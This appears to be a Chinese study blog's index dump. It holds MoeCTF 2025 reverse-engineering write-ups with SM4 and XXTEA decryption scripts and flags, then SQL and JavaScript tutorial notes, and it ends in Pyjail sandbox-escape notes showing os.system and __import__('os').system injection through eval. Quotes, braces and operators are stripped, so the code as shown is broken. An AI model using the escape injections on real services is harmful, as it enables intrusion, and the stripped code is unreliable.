打开，一眼就看到 ezandroidpro_MainActivity_check 字样 返回值是 bVar2 ，希望最后是 True ，这样就可以通过检查 bVar2 1 要求 *pcVar6 *pcVar7，后面两个指针向后移动，同时 uVar5 减一，那可以猜到这应该是在比较两个数组，需要前 uVar5 个元素全部一样 pcVar6 来自 local_a0 pcVar7 来自 pcVar4 就是硬编码的一长串字符 注意到一个sm4Encrypt加密，这是一个对称加密，密钥是什么呢？好难猜啊，大概就是硬编码的 moectf2025!!!!!! from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPTkey = bmoectf2025!!!!!! # 16字节ciphertext_hex = 4EEB1EEF2914D79BFA8C5006332097ED2EF06C4A59CAE31C827A08D45CC649C0B971BF2EFBCB160E531A646DF7A6AC0Bciphertext = bytes.fromhex(ciphertext_hex)crypt_sm4 = CryptSM4()crypt_sm4.set_key(key, SM4_DECRYPT)plaintext = crypt_sm4.crypt_ecb(ciphertext)print(plaintext) 输出： moectfSM4_Android_I5_Funing!!! rusty_sudo数独游戏 反编译看看： 几百行的代码，注意到第一个出现的长字符串不是控制台中输出的字符串，它肯定在前面就出现过了。 注意到上面一些奇奇怪怪的变换，点进数组标识符 成功发现了提示信息，但是前面又有一点其他东西，还带………，刚好 81 个字符，可以猜到这就是数独棋盘，接下来要填数独了。 使用 Ghidra 能直接看到数独盘的输出 运行成功程序还退出了，那我们在退出的地方下断点，然后调试，最终果然输出 flag moectfa8c79927d4e830c3fe52e79f410216a0 2048WinMain 函数 Wndproc 函数： 查阅一些资料： 消息类型：WM_PAINT 0x000F 15 要求一个窗口重画自己WM_ERASEBKGND 0x0014 20 当窗口背景必须被擦除时（例在窗口改变大小时）WM_KEYDOWN 0x0100 256 按下一个键 所以上面截图的部分，应该是 2048 这个游戏的逻辑 现在寻找 flag 239 行这个函数就很可疑 果然，如下图，有一个比较，如果 result 13 ，就会有一个输出 flag 的提示 在这下断点，执行到这，需要 eax 大于 0D，随便换成一个数： 输出： moectfY0u_4re_a_2048_m4st3r!!!!r0erowhu 但是这个 flag 提交一直失败，最后发现这是 Misc 的 master 的答案，不是这个 重新寻找 flag 还有块加密 在这下断点：看看块加密的几个参数是什么 a1 是输入flag.txt 文件的字符串，a2 是这个字符串长度，v7 是输出的参数 注意到这是个 XXTEA 加密 import structdef xxtea_decrypt(v, n, k, delta=0x3E9779B9): v = list(v) rounds = 6 + 52 // n sum_ = (rounds * delta) 0xFFFFFFFF y = v[0] for _ in range(rounds): e = (sum_ 2) 3 for p in range(n - 1, 0, -1): z = v[p - 1] mx = (((z 5) ^ (y 2)) + ((y 3) ^ (z 4))) 0xFFFFFFFF mx ^= (((sum_ ^ y) + (k[(p 3) ^ e] ^ z)) 0xFFFFFFFF) v[p] = (v[p] - mx) 0xFFFFFFFF y = v[p] z = v[n - 1] mx = (((z 5) ^ (y 2)) + ((y 3) ^ (z 4))) 0xFFFFFFFF mx ^= (((sum_ ^ y) + (k[(0 3) ^ e] ^ z)) 0xFFFFFFFF) v[0] = (v[0] - mx) 0xFFFFFFFF y = v[0] sum_ = (sum_ - delta) 0xFFFFFFFF return v# 已知密文cipher = bytes([0x35, 0x79, 0x77, 0xCC, 0x1B, 0x13, 0x41, 0x34, 0xF9, 0xFF, 0x9F, 0x91, 0xFF, 0x5B, 0x94, 0x78, 0x86, 0x2A, 0xAF, 0xAE, 0xD7, 0x9E, 0x31, 0x4D, 0x7A, 0xC4, 0xA5, 0x51, 0xD1, 0xD9, 0x6E, 0x44, 0x18, 0x52, 0x86, 0x1B, 0x42, 0x8A, 0xC9, 0x63])# 打包成10个uint32v = list(struct.unpack(10I, cipher))# 密钥key_bytes = b2048master2048mak = list(struct.unpack(4I, key_bytes))# 解密 (使用n=10)decrypted_v = xxtea_decrypt(v, 10, k)# 解包成40字节plain_padded = struct.pack(10I, *decrypted_v)# 取前37字节作为flag，并解码为字符串（假设ASCII）flag = plain_padded[:37].decode(ascii)print(Flag:, flag)","categories":["MoeCTF 2025"]},{"title":"SQL","path":"//SQL/","content":"SQL基础学习，查填删改等基础命令 SQLSQL（Structured Query Language，结构化查询语言）是用于管理和操作关系型数据库的标准语言。 基础操作查询数据-- 查询所有列SELECT * FROM students;-- 查询指定列SELECT name, age FROM students;-- 带条件查询SELECT * FROM students WHERE city = 北京;-- 排序（ORDER BY）SELECT * FROM students ORDER BY age DESC; -- 按年龄降序 插入数据INSERT INTO students (id, name, age, city)VALUES (3, 王五, 19, 广州); 更新数据UPDATE studentsSET age = 21WHERE name = 张三; 删除数据DELETE FROM studentsWHERE id = 2; 创建表CREATE TABLE students ( id INT PRIMARY KEY, name VARCHAR(50), age INT, city VARCHAR(50)); 删除表DROP TABLE students; 进阶操作条件查询-- 组合条件SELECT * FROM studentsWHERE age 20 AND city = 上海;-- 模糊查询SELECT * FROM studentsWHERE name LIKE %三%; -- 查找名字包含“三”的记录 聚合函数SELECT COUNT(*) AS total_students FROM students;SELECT AVG(age) AS avg_age FROM students; COUNT()：计数 SUM()：求和 AVG()：平均值 MAX()/MIN()：最大最小值 连接查询-- 假设有另一张表 classesSELECT s.name, c.class_nameFROM students sJOIN classes c ON s.class_id = c.id; 分组SELECT city, COUNT(*) AS student_countFROM studentsGROUP BY city;","categories":["Language"]},{"title":"Javascript","path":"//Javascript/","content":"Javascript学习，包括基础语法、类与继承、错误、闭包、表单以及异步编程、文档对象模型、浏览器对象模型 JavaScriptJavaScript 是一个轻量级，但功能强大的脚本语言。 sudo apt install nodejs node my_Script.js JsFuck混淆 简介JavaScript 可以放到 HTML 页面的 head 或者 body ，或者保存到外部文件，可以在某个事件发生时执行 外部文件通常包含被多个网页使用的代码，可以代码复用 浏览器的渲染引擎（如Blink、Gecko）解析HTML文档。 当解析到 script标签时（无论是内联脚本还是外部脚本），浏览器会发起网络请求（对于外部脚本）来获取JS代码。 获取到JS代码（无论是来自网络还是直接写在HTML里）后，会将其交给JS引擎。 JS引擎编译并执行这些代码。执行过程可能会操作DOM（改变页面结构）、处理数据、发送网络请求等。 基础语法输出 JavaScript 没有任何打印或者输出的函数，但通过不同的方式来输出数据： 使用 window.alert() 弹出警告框。 使用 document.write() 方法将内容写到 HTML 文档中。 使用 innerHTML 写入到 HTML 元素。 使用 console.log() 写入到浏览器的控制台。 确认框 var r=confirm(按下按钮);if (r==true) x=你按下了\\确定\\按钮!;else x=你按下了\\取消\\按钮!; 提示框 var person=prompt(请输入你的名字,Harry Potter);if (person!=null person!=) x=你好 + person + ! 今天感觉如何?; document.getElementById(demo).innerHTML=x; 使用 document.getElementById(id) 方法。 使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容： 使用 document.write() 可以向文档写入内容。 数据与操作 固定值被称为字面量 包括 数字字面量、字符串字面量、表达式字面量、数组字面量、对象字面量、函数字面量 3.14 // 整数、小数、或科学计数(e)Hello // 双引号和单引号都行Hello 5 + 6 // 表达式字面量[1,2,3,4] // 数组字面量name:John, age:18, eyeColor:blue // 对象字面量function myFunction(a,b) return a*b // 函数字面量 使用 var 定义变量，等号赋值 var x,length;x = 5;length = 6; 操作符 = + - * / ==!= + 也可用于字符串拼接，也可用于数字与字符串拼接（返回字符串） === 绝对等于：值和类型均相等!== 严格不等于：值和类型至少有一个不相等 ||! name=(condition)?value1:value2 语句 在HTML中，语句用于向浏览器发出命令，使用分号分隔（也可以不带） 语句 描述 break 用于跳出循环。 catch 语句块，在 try 语句块执行出错时执行 catch 语句块。 continue 跳过循环中的一个迭代。 do … while 执行一个语句块，在条件语句为 true 时继续执行该语句块。 for 在条件语句为 true 时，可以将代码块执行指定的次数。 for … in 用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）。 function 定义一个函数 if … else 用于基于不同的条件来执行不同的动作。 return 返回结果，并退出函数 switch 用于基于不同的条件来执行不同的动作。 throw 抛出（生成）错误 。 try 实现错误处理，与 catch 一同使用。 var 声明一个变量。 while 当条件语句为 true 时，执行语句块。 支持标签，break、continue 也可以用于跳出标签代码块 switch 语句会使用恒等计算符()进行比较，要求类型和值都一样 注释： // 不会执行 折行 document.write(Hello \\World); JavaScript 是脚本语言，浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。 使用 var 声明变量，特点： 变量可以重复声明（覆盖原变量）。 变量未赋值时，默认值为 undefined。 var 声明的变量会提升（Hoisting），但不会初始化。 在 2015 后的 JavaScript 版本 (ES6) 允许我们使用 const 关键字来定义一个常量，使用 let 关键字定义限定范围内作用的变量。 let city = 北京;let age = 30;console.log(city, age); // 输出: 北京 30 const 用于定义常量，即一旦赋值后，变量的值不能再被修改。 数据类型 值类型(基本类型)：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol。 引用数据类型（对象类型）：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date）。 变量的数据类型可以使用 typeof 操作符来查看： if (typeof variable === undefined) ... // 检测未定义变量if (typeof myFunction === function) ... // 检测函数是否存在 // 正确检测数组if (Array.isArray(myVar)) ...// 正确检测nullif (myVar === null) ... null 和 undefined 的值相等，但类型不等： typeof undefined // undefinedtypeof null // objectnull === undefined // falsenull == undefined // true 数组： // 创建数组var cars=new Array();cars[0]=Saab;cars[1]=Volvo;cars[2]=BMW;var cars=new Array(Saab,Volvo,BMW);var cars=[Saab,Volvo,BMW]; 对象 var person=firstname:John, lastname:Doe, id:5566;// 空格和折行无关紧要// 两种寻址方式 name=person.lastname;name=person[lastname]; JavaScript 变量均为对象。当您声明一个变量时，就创建了一个新的对象。 当声明新变量时，可以使用关键词 “new” 来声明其类型： var carname=new String; JavaScript 对象是属性和方法的容器。 对象的方法定义一个函数，并作为对象的属性存储。 对象方法通过添加 () 调用 (作为一个函数)。 函数function myFunction(var1,var2) var x=5; return x; 在 JavaScript 函数内部声明的变量（使用 var）是局部变量，所以只能在函数内部访问它。 在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问它。 如果您把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。 carname=Volvo; 将声明 window 的一个属性 carname。 在浏览器中，window是最顶层的对象，所有全局变量和函数都是它的属性或方法。 这种写法在严格模式（use strict）下会报错，因为严格模式禁止隐式创建全局变量。 在函数内部不使用 var、let 或 const 等关键字声明变量时，该变量会被视为全局变量，从而可以在函数外部访问。 但这种做法通常不推荐，因为它可能导致意外的副作用和代码难以维护。 定义在全局作用域中的变量和函数都会变成 window 对象的属性和方法，因此可以在调用时省略 window，直接使用变量名或函数名。 对象方法作为一个函数定义存储在对象属性中。 var person = firstName: John, lastName : Doe, id : 5566, fullName : function() return this.firstName + + this.lastName; ;document.getElementById(demo).innerHTML = person.fullName(); 大小写敏感 HMTL事件 事件 描述 onchange HTML 元素改变 onclick 用户点击 HTML 元素 onmouseover 鼠标指针移动到指定的元素上时发生 onmouseout 用户从一个 HTML 元素上移开鼠标时发生 onkeydown 用户按下键盘按键 onload 浏览器已完成页面的加载 some-HTML-element some-event=JavaScript 代码 button onclick=getElementById(demo).innerHTML=Date()现在的时间是?/button !--demo段被赋值为日期--button onclick=this.innerHTML=Date()现在的时间是?/button !--这个按钮内容被赋值为日期--button onclick=displayDate()现在的时间是?/button !--函数执行操作-- 字符集 Javascript 使用 Unicode 字符集 字符串属性 属性 描述 constructor 返回创建字符串属性的函数 length 返回字符串的长度 prototype 允许您向对象添加属性和方法 John.constructor // 返回函数 String() [native code] (3.14).constructor // 返回函数 Number() [native code] false.constructor // 返回函数 Boolean() [native code] [1,2,3,4].constructor // 返回函数 Array() [native code] name:John, age:34.constructor // 返回函数 Object() [native code] new Date().constructor // 返回函数 Date() [native code] function () .constructor // 返回函数 Function() [native code] typeof 只能查看数据类型 typeof John // 返回 string typeof 3.14 // 返回 numbertypeof NaN // 返回 numbertypeof false // 返回 booleantypeof [1,2,3,4] // 返回 objecttypeof name:John, age:34 // 返回 objecttypeof new Date() // 返回 objecttypeof function () // 返回 functiontypeof myCar // 返回 undefined (如果 myCar 没有声明)typeof null // 返回 object 可以使用 constructor 属性来查看对象是否为数组、日期 (包含字符串 “Array”、”Date”)： function isArray(myArray) return myArray.constructor.toString().indexOf(Array) -1;function isDate(myDate) return myDate.constructor.toString().indexOf(Date) -1; 模板字符串模板字面量是用反引号（）分隔的字面量，允许多行字符串、带嵌入表达式的字符串插值和一种叫带标签的模板的特殊结构。 const name = Runoob;const age = 30;const message = `My name is $name and Im $age years old.`;document.getElementById(demo).innerHTML = message; 以上实例中，${name} 和 ${age} 是模板字符串的表达式部分，它们被包含在 ${} 内部，并在运行时求值。 模板字符串允许你在字符串中引用变量、执行函数调用和进行任意的JavaScript表达式。 let price = 10;let VAT = 0.25;let total = `Total: $(price * (1 + VAT)).toFixed(2)`; 带函数的模板字符串 const name = John;const age = 31;const job = Web Developer;const city = Beijing;function hello() return hello;let str =`Name:$nameage:$agejob:$jobcity:$citycalc:$2+2function:$hello()sanmu: $age 30 ? over 30: under 30 `console.log(str); 显示： Name:Johnage:31job:Web Developercity:Beijingcalc:4function:hellosanmu: over 30 函数function functionName(parameters) 执行的代码 函数表达式 var x = function (a, b) return a * b;// 在函数表达式存储在变量后，变量也可作为一个函数使用： Function() 构造函数 var myFunction = new Function(a, b, return a * b);var x = myFunction(4, 3); 函数提升，可以在声明之前调用。使用表达式定义函数时无法提升。 自定义函数 (function () var x = Hello!!; // 我将调用自己)();// 匿名自我调用的函数 (没有函数名)。 函数是对象：在 JavaScript 中使用 typeof 操作符判断函数类型将返回 “function” 。 箭头函数 (参数1, 参数2, …, 参数N) = 函数声明 (参数1, 参数2, …, 参数N) = 表达式(单一)() = 函数声明 //没有参数 this面向对象语言中 this 表示当前对象的一个引用。 但在 JavaScript 中 this 不是固定不变的，它会随着执行环境的改变而改变。 在方法中，this 表示该方法所属的对象。 如果单独使用，this 表示全局对象。 在函数中，this 表示全局对象。 在函数中，在严格模式下，this 是未定义的(undefined)。 在事件中，this 表示接收事件的元素。 类似 call() 和 apply() 方法可以将 this 引用到任何对象。 对象方法全局方法 String() 可以将数字转换为字符串。 Date() 返回字符串。 全局方法 Number() 可以将字符串转换为数字。 包含数字(如 “3.14”) 转换为数字 (如 3.14) 空字符串转换为 0 其他的字符串会转换为 NaN (不是个数字) Number 对象方法 方法 描述 isFinite 检测指定参数是否为无穷大。 isInteger 检测指定参数是否为整数。 isNaN 检测指定参数是否为 NaN。 isSafeInteger 检测指定参数是否为安全整数。 toExponential(x) 把对象的值转换为指数计数法。 toFixed(x) 把数字转换为字符串，结果的小数点后有指定位数的数字。 toLocaleString(locales, options) 返回数字在特定语言环境下的表示字符串。 toPrecision(x) 把数字格式化为指定的长度。 toString() 把数字转换为字符串，使用指定的基数。 valueOf() 返回一个 Number 对象的基本数字值 Date 对象方法 方法 描述 getDate() 从 Date 对象返回一个月中的某一天 (1 ~ 31)。 getDay() 从 Date 对象返回一周中的某一天 (0 ~ 6)。 getFullYear() 从 Date 对象以四位数字返回年份。 getHours() 返回 Date 对象的小时 (0 ~ 23)。 getMilliseconds() 返回 Date 对象的毫秒(0 ~ 999)。 getMinutes() 返回 Date 对象的分钟 (0 ~ 59)。 getMonth() 从 Date 对象返回月份 (0 ~ 11)。 getSeconds() 返回 Date 对象的秒数 (0 ~ 59)。 getTime() 返回 1970 年 1 月 1 日至今的毫秒数。 类与继承class ClassName constructor() ... 使用 new 关键字 创建对象时会自动调用构造函数方法 constructor()。 类表达式 // 未命名/匿名类let Runoob = class constructor(name, url) this.name = name; this.url = url; ;console.log(Runoob.name);// output: Runoob // 命名类let Runoob = class Runoob2 constructor(name, url) this.name = name; this.url = url; ;console.log(Runoob.name);// 输出: Runoob2 JavaScript 类继承使用 extends 关键字。super() 方法用于调用父类的构造函数。 // 基类class Animal // eat() 函数 // sleep() 函数; //派生类class Dog extends Animal // bark() 函数; 类中我们可以使用 getter 和 setter 来获取和设置值，getter 和 setter 都需要在严格模式下执行。 const user = _age: 0, // 下划线约定表示私有变量 get age() return this._age; , set age(value) if (value 0) console.log(年龄不能为负数); return; this._age = value; ;// 看似访问user类的age数据，实际上是调用set age函数， _ 实现这个看似user.age = 25; // 正常工作 console.log(user.age); // 25user.age = -5; // 输出年龄不能为负数console.log(user.age); // 仍为25 特别适合需要验证、计算或封装的情况 可以在属性名称前使用下划线字符 _ 将 gettersetter 与实际属性分开：它们看起来像普通属性，但实际上是方法调用 函数声明和类声明之间的一个重要区别在于, 函数声明会提升，类声明不会。 静态方法是使用 static 关键字修饰的方法，又叫类方法，属于类的，但不属于对象，在实例化对象之前可以通过 类名.方法名 调用静态方法。 静态方法：属于类本身，不依赖实例，适合工具函数、全局计算（Number.isNaN, Date.now）。 实例方法：属于对象实例，依赖 this，适合操作实例数据（date.getTime(), arr.push()）。 自动转换类型Javascript 是弱类型语言，当 JavaScript 尝试操作一个 “错误” 的数据类型时，会自动转换为 “正确” 的数据类型。 5 + null // 返回 5 null 转换为 05 + null // 返回5null null 转换为 null5 + 1 // 返回 51 1 转换为 1 5 - 1 // 返回 4 5 转换为 5 当你尝试输出一个对象或一个变量时 ，JavaScript 会自动调用变量的 toString() 方法： myVar = name:Fjohn // toString 转换为 [object Object]myVar = [1,2,3,4] // toString 转换为 1,2,3,4myVar = new Date() // toString 转换为 Fri Jul 18 2014 09:08:55 GMT+0200document.getElementById(demo).innerHTML = myVar; 一些值得注意的情况： “0” 转换为布尔值 是 true “” 转换成数字是 0 ，转换成布尔值是 false [] 转换成数字是 0 ，转换成布尔值是 true 正则表达式正则表达式（英语：Regular Expression，在代码中常简写为regex、regexp或RE）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。 /正则表达式主体/修饰符(可选) 修饰符 描述 i 执行对大小写不敏感的匹配。 g 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。 m 执行多行匹配。 在 JavaScript 中，正则表达式通常用于两个字符串方法 : search() 和 replace()。 search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。 replace() 方法用于在字符串中用一些字符串替换另一些字符串，或替换一个与正则表达式匹配的子串。 var str = Visit Runoob!; var n = str.search(/Runoob/i); 正则表达式模式方括号用于查找某个范围内的字符： 表达式 描述 [abc] 查找方括号之间的任何字符。 [0-9] 查找任何从 0 至 9 的数字。 (x|y) 查找任何以 | 分隔的选项。 元字符是拥有特殊含义的字符： 元字符 描述 \\d 查找数字。 \\s 查找空白字符。 \\b 匹配单词边界。 \\uxxxx 查找以十六进制数 xxxx 规定的 Unicode 字符。 量词: 量词 描述 n+ 匹配任何包含至少一个 n 的字符串。 n* 匹配任何包含零个或多个 n 的字符串。 n? 匹配任何包含零个或一个 n 的字符串。 使用 exec()exec() 方法是一个正则表达式方法。 exec() 方法用于检索字符串中的正则表达式的匹配。 该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。 错误错误 try 语句测试代码块的错误。 catch 语句处理错误。 throw 语句创建自定义错误。 finally 语句在 try 和 catch 语句之后，无论是否有触发异常，该语句都会执行。 try ... //异常的抛出 catch(e) ... //异常的捕获与处理 finally ... //结束处理 变量提升 声明提升：函数声明和变量声明总是会被解释器悄悄地被”提升”到方法体的最顶部。 但是初始化不会提升，只有声明的变量会提升，同时初始化的变量不会。 严格模式 消除 Javascript 语法的一些不合理、不严谨之处，减少一些怪异行为。 消除代码运行的一些不安全之处，保证代码运行的安全。 提高编译器效率，增加运行速度。 为未来新版本的Javascript做好铺垫。 闭包JavaScript 闭包 使得函数拥有私有变量变成可能。 function outer() let count = 0; // 外部函数的变量 function inner() count++; // 内部函数访问外部变量 console.log(count); return inner; // 返回内部函数const closureFunc = outer(); // 调用 outer 函数，声明 inner 函数，并返回closureFunc(); // 输出: 1 count变量被 inner函数引用，不会销毁closureFunc(); // 输出: 2closureFunc(); // 输出: 3 这个 inner函数通过闭包机制记住了 count变量的状态，成为函数的私有变量。仅能通过该函数访问。 表单表单验证判断表单字段 fname 是否存在，不存在弹出信息阻止表单提交 function validateForm() var x = document.forms[myForm][fname].value; if (x == null || x == ) alert(需要输入名字。); return false; 验证输入的数字h1JavaScript 验证输入/h1p请输入 1 到 10 之间的数字：/pinput id=numbbutton type=button onclick=myFunction()提交/buttonp id=demo/pscriptfunction myFunction() var x, text; // 获取 id=numb 的值 x = document.getElementById(numb).value; // 如果输入的值 x 不是数字或者小于 1 或者大于 10，则提示错误 if (isNaN(x) || x 1 || x 10) text = 输入错误; else text = 输入正确; document.getElementById(demo).innerHTML = text;/script 数据验证服务端数据验证是在数据提交到服务器上后再验证。 客户端数据验证是在数据发送到服务器前，在浏览器上完成验证。 使用正则表达式进行验证邮箱验证 function validateEmail(email) var regex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/; return regex.test(email);var email = example@example.com;if (validateEmail(email)) console.log(Valid email address.); else console.log(Invalid email address.); 验证 API约束验证 API const emailInput = document.getElementById(email);// 检查输入是否有效if (!emailInput.checkValidity()) console.log(验证失败:, emailInput.validationMessage); // 查看具体错误类型 if (emailInput.validity.typeMismatch) console.log(请输入有效的电子邮件地址); // 设置自定义验证passwordInput.setCustomValidity(密码必须包含至少一个数字); Property Description checkValidity() 如果 input 元素中的数据是合法的返回 true，否则返回 false。 setCustomValidity() 设置 input 元素的 validationMessage 属性，用于自定义错误提示信息的方法。 使用 setCustomValidity 设置了自定义提示后，validity.customError 就会变成 true，checkValidity 总是会返回 false。 如果要重新判断必须通过设置空值(, null, undefined)来清除自定义错误 属性 描述 validity 布尔属性值，返回 input 输入值是否合法 validationMessage 浏览器错误提示信息 willValidate 指定 input 是否需要验证 正则表达式验证 // 验证电子邮件function isValidEmail(email) const regex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/; return regex.test(email);// 验证手机号（中国大陆）function isValidPhone(phone) const regex = /^1[3-9]\\d9$/; return regex.test(phone); 自定义验证 // 密码匹配验证function validatePassword() const password = document.getElementById(password); const confirm = document.getElementById(confirm-password); if (password.value !== confirm.value) confirm.setCustomValidity(两次输入的密码不匹配); else confirm.setCustomValidity(); // 实时验证document.getElementById(confirm-password).addEventListener(input, validatePassword); 生成器函数调用生成器函数不会立即执行其代码，而是返回一个生成器对象 yield是生成器函数中的核心关键字，它有两个主要功能： 暂停函数执行：当执行到 yield时，函数会暂停并将 yield后面的表达式作为返回值 接收外部传入的值：当恢复执行时，可以通过生成器对象的 next()方法传入值，这个值会成为 yield表达式的返回值 function* twoWayGenerator() const name = yield 请输入你的名字; yield `你好, $name!`;const gen = twoWayGenerator();console.log(gen.next()); // value: 请输入你的名字, done: false console.log(gen.next(张三)); // value: 你好, 张三!, done: false function* asyncGenerator() const result1 = yield fetchData1(); const result2 = yield fetchData2(result1); return processResults(result2);// 使用辅助函数执行function runGenerator(gen) const iterator = gen(); // 实例化生成器，返回迭代器 function iterate(iteration) if (iteration.done) return iteration.value; const promise = iteration.value; return promise.then(x = iterate(iterator.next(x))); // 重复 Promise 处理流程 return iterate(iterator.next()); // 启动生成器执行 // 首次 next()→ 暂停在第一个 yield，返回 fetchData1()的 PromiserunGenerator(asyncGenerator); 异步编程回调函数在启动一个异步任务时设定行为，让主进程无需关心异步任务的状态 setTimeout(function () document.getElementById(demo1).innerHTML=RUNOOB-1!; // 三秒后子线程执行, 3000);document.getElementById(demo2).innerHTML=RUNOOB-2!; // 主线程先执行 PromisePromise 是 JavaScript 中用于处理异步操作的对象，它代表一个异步操作的最终完成（或失败）及其结果值。 Promise 是一个”承诺”，表示将来某个时间点会返回一个结果（可能是成功的结果，也可能是失败的原因）。 function getUser(userId) return fetch(`/users/$userId`);function getPosts(userId) return fetch(`/users/$userId/posts`);getUser(123) .then((user) = // then() 方法用于指定 Promise 状态变为 fulfilled 或 rejected 时的回调函数。 console.log(获取用户信息:, user); return getPosts(user.id); ) .then((posts) = // 链式调用多个异步操作。 console.log(获取用户帖子:, posts); ) .catch((error) = // catch() 方法专门用于处理 Promise 被拒绝的情况。 console.error(操作失败:, error); );// finally() 方法无论 Promise 最终状态如何都会执行。 Promise 的静态方法： Promise.all()：等待所有 Promise 完成，或任意一个 Promise 失败。 Promise.race()：返回最先完成（无论成功或失败）的 Promise 的结果。 Promise.resolve()：快速创建已解决 Promise。 Promise.reject()：快速创建已拒绝的 Promise。 一个实例： asyncawait在函数声明前添加 async 关键字，表示该函数是异步的： async function fetchData() // 函数体 async 函数总是返回一个 Promise： 如果返回值不是 Promise，会自动包装成 resolved Promise 如果抛出异常，会返回 rejected Promise await 只能在 async 函数内部使用：await 会暂停 async 函数的执行，等待 Promise 完成 const response = await fetch(/test_talent?level=S, method: POST, headers: Content-Type: application/json , body: JSON.stringify( manifestation: flowing_azure_clouds ) ); fetch：现代浏览器提供的 HTTP 请求 API，用于发起网络请求。 请求目标：/test_talent?level=S 请求方法：method: POST 如果 Promise 被 resolve，返回 resolve 的值 如果 Promise 被 reject，抛出错误（可以用 trycatch 捕获） 文档对象模型 HTML DOM（简）通过 HTML DOM，可访问 JavaScript HTML 文档的所有元素。 通过 id 查找 HTML 元素 var x=document.getElementById(intro); 通过标签名查找 HTML 元素（查找 id”main” 元素中的所有 p 元素） var x=document.getElementById(main);var y=x.getElementsByTagName(p); 通过类名找到 HTML 元素 var x=document.getElementsByClassName(intro); 浏览器对象模型 BOMJavaScript Window，浏览器对象模型（Browser Object Model (BOM)）尚无正式标准。 Window对象所有浏览器都支持 window 对象。它表示浏览器窗口。 所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。 全局变量是 window 对象的属性。 全局函数是 window 对象的方法。 HTML DOM 的 document 也是 window 对象的属性之一： window.open() - 打开新窗口 window.close() - 关闭当前窗口 window.moveTo() - 移动当前窗口 window.resizeTo() - 调整当前窗口的尺寸 window.screen 对象包含有关用户屏幕的信息，在编写时可以不使用 window 这个前缀。 screen.availWidth 可用宽度screen.availHeight 可用高度 Window Location 用于获得当前页面的地址 (URL)，并把浏览器重定向到新的页面。 location.href 返回当前页面的 URLlocation.pathname 返回 URL 的路径名location.assign() 加载新的文档 window.history 对象包含浏览器的历史。 history.back() 与在浏览器点击后退按钮相同history.forward() 与在浏览器中点击向前按钮相同history.go(0); go() 里面的参数为0,表示刷新页面history.go(1); go() 里面的参数表示跳转页面的个数 前进一个页面history.go(-1); go() 里面的参数表示跳转页面的个数 后退一个页面 window.navigator 对象包含有关访问者浏览器的信息。 scripttxt = p浏览器代号: + navigator.appCodeName + /p;txt+= p浏览器名称: + navigator.appName + /p;txt+= p浏览器版本: + navigator.appVersion + /p;txt+= p启用Cookies: + navigator.cookieEnabled + /p;txt+= p硬件平台: + navigator.platform + /p;txt+= p用户代理: + navigator.userAgent + /p;txt+= p用户代理语言: + navigator.language + /p;document.getElementById(example).innerHTML=txt;/script 计时事件 setInterval() - 间隔指定的毫秒数不停地执行指定的代码。 p id=demo/pbutton onclick=myStopFunction()停止/buttonscriptvar myVar=setInterval(function()myTimer(),1000);function myTimer() var d=new Date(); var t=d.toLocaleTimeString(); document.getElementById(demo).innerHTML=t;function myStopFunction() clearInterval(myVar);/script clearInterval() 方法用于停止 setInterval() 方法执行的函数代码。 setTimeout() - 在指定的毫秒数后执行指定代码。 var myVar; function myFunction() myVar=setTimeout(function()alert(Hello),3000); function myStopFunction() clearTimeout(myVar); 一些小知识a = 8 + 8; // 返回 88// 具有第一个整数和第二个字符串数据类型。会将两个数字连接起来。（弱类型语言） var a = RunoobGoogle; var result = a.substring(4, 5); // substring 方法选择从 4 到 5 的子字符串，不包括第 5 个索引。索引从0开始。 JavaScript 中的 trim() 方法用于删除字符串开头和结尾的空格。 forEach() 为数组中的每个元素调用一个函数 JavaScript 是一种浏览器端脚本语言。ASP、PHP、Perl 都是服务器端脚本语言 === 是严格相等运算符，会比较值和类型。== 会进行类型转换，可能导致意外的结果。 let 不允许在同一作用域内重复声明同一个变量，而 var 可以。let 有块级作用域、var 有函数作用域 console.log([] == ![]);// []是一个空数组，它是一个对象。在布尔上下文中，所有对象（包括空数组）都是 true。// ![] 转换为 false，[]转换为 ，两者弱比较相等 typeof null 返回 “object” JSON.parse(JSON.stringify(obj)) 可以实现简单对象的深拷贝，但会丢失函数和循环引用。 闭包会保留对外部函数变量的引用，因此会阻止这些变量被垃圾回收，增加内存消耗，同时也可以访问这些变量。 const promise = new Promise((resolve) = console.log(1); resolve(2); console.log(3););promise.then(console.log);console.log(4);// 创建 Promise 时，传入的执行器函数会立即执行// 执行器函数中：// 先执行 console.log(1)输出 1// 然后调用 resolve(2)，将 Promise 状态改为 resolved// 接着执行 console.log(3)输出 3// Promise 创建后，调用 then方法注册回调（此时 Promise 已是 resolved 状态）// 执行 console.log(4)输出 4// 同步代码执行完毕后，事件循环开始处理微任务队列// 执行之前注册的 then回调 console.log，输出 2","categories":["Language"]},{"title":"Pyjail 沙箱逃逸","path":"//Pyjail 沙箱逃逸/","content":"Pyjail 沙箱逃逸，绕过代码过滤、运行时沙箱、系统层限制 Pyjail的限制机制Pyjail的限制机制（层次结构）Pyjail通过多层限制防止用户执行危险操作，以下是常见的限制层次： 1 代码过滤层：禁止特定关键词 2 运行时沙箱层：禁用模块和函数 3 系统层限制：限制与系统交互 基础命令执行输入代码 eval：计算单个表达式并返回结果。 code = input() # 假设这里可以输入代码eval(code) exec：可以执行多行代码、语句（如 if、for、def等），但不会返回结果（返回 None）。 exec(print(Hello)) 执行系统命令import osos.system(ls) __import__(os).system(ls) 在输入代码里注入系统命令，即可实现沙箱逃逸，获取服务器系统信息。 搜索文件： grep -r flag / 2/dev/null # 查找内容 flag...find / -name flag.txt # 查找 flag.txt 文件 绕过命令代码过滤层import关键字被过滤如果 import 在注入代码中是字符串，就可利用字符串拼接绕过 